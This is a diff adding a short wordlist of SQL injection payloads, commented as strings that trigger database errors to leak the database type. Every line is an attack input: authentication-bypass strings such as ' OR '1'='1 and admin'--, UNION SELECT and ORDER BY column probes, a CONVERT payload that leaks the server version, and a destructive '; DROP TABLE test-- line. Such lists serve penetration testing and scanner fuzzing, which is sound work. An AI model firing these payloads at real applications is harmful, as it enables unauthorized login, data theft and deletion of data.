@@ -1,0 +1,27 @@
+# Error-Based SQL Injection Payloads
+# These trigger database syntax errors that leak DB type info in error messages
+'
+"
+' OR '1'='1
+" OR "1"="1
+' OR '1'='1'--
+' OR '1'='1'/*
+' OR 1=1--
+" OR 1=1--
+' OR 1=1#
+') OR ('1'='1
+')) OR (('1'='1
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+1' ORDER BY 1--
+1' ORDER BY 10--
+1' AND 1=CONVERT(int,(SELECT @@version))--
+' AND 1=1--
+' AND 1=2--
+'; DROP TABLE test--
+' OR 'x'='x
+1 OR 1=1
+' OR ''='
+' OR 1=1 LIMIT 1--
+admin'--
